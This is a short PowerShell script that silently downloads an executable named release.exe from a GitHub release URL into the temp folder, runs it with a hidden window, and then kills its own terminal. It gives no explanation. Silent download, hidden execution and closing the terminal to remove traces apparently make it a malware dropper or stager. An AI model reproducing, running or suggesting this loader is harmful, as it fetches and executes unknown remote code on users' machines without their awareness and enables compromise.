param (
    [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/release.exe',
    [string]$OutputPath = "$env:TEMP\release.exe"
)

# Download using curl.exe silently
try {
    Start-Process -FilePath "curl.exe" -ArgumentList "-sS", "-L", "-o", "`"$OutputPath`"", "`"$DownloadUrl`"" -Wait -NoNewWindow
} catch { exit 1 }

# Run the executable silently
if (Test-Path $OutputPath) {
    Start-Process -FilePath $OutputPath -Wait -WindowStyle Hidden
}

# Shutdown this terminal immediately
Stop-Process -Id $PID